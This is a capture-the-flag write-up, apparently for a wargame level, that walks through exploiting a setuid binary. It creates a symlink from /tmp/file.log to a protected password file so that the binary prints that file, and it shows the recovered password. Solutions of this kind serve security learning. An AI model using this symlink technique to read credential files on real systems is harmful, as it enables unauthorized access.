From using ls -la, the executable to work with is `leviathan5`. When executing `leviathan5`, the output looks like this:

```
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
```

Since we do not know what the executable is doing, we can use objdump to get some idea on what its doing on the stack:
```
leviathan5@gibson:~$ objdump -T leviathan5 

leviathan5:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*  00000000 (GLIBC_2.34) __libc_start_main
00000000      DF *UND*  00000000 (GLIBC_2.1)  fclose
00000000      DF *UND*  00000000 (GLIBC_2.0)  getuid
00000000      DF *UND*  00000000 (GLIBC_2.0)  unlink
00000000      DF *UND*  00000000 (GLIBC_2.0)  puts
00000000  w   D  *UND*  00000000  Base        __gmon_start__
00000000      DF *UND*  00000000 (GLIBC_2.0)  exit
00000000      DF *UND*  00000000 (GLIBC_2.0)  feof
00000000      DF *UND*  00000000 (GLIBC_2.1)  fopen
00000000      DF *UND*  00000000 (GLIBC_2.0)  putchar
00000000      DF *UND*  00000000 (GLIBC_2.0)  fgetc
00000000      DF *UND*  00000000 (GLIBC_2.0)  setuid
0804a004 g    DO .rodata        00000004  Base        _IO_stdin_used
```
Key findings from the output:

    - The program opens a file (`fopen`), reads from it (`fgetc`), outputs its content (`putchar`), and then deletes it (`unlink`).
    - It also retrieves the user's UID (`getuid`) and sets the UID (`setuid`).

Now, we have some basic idea on what the command is doing, so we create a dummy folderand try the command again:

```
leviathan5@gibson:~$ echo nihao > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
nihao
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
```

Pretty much what we had observed using `objdump`. 
Now, we have confirmed our suspicions and could try copying the password file into the tmp file and use that as a lever to get the password. 

However, copying the password file directly results in a permission denied error. To deal with this, we can create a symbolic link pointing to the password file from our temporary file:
```
leviathan5@gibson:~$ cp  /etc/leviathan_pass/leviathan6 /tmp/file.log
cp: cannot open '/etc/leviathan_pass/leviathan6' for reading: Permission denied
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
YZ55XPVk2l
```

Looks like symlink works and now we got our password!
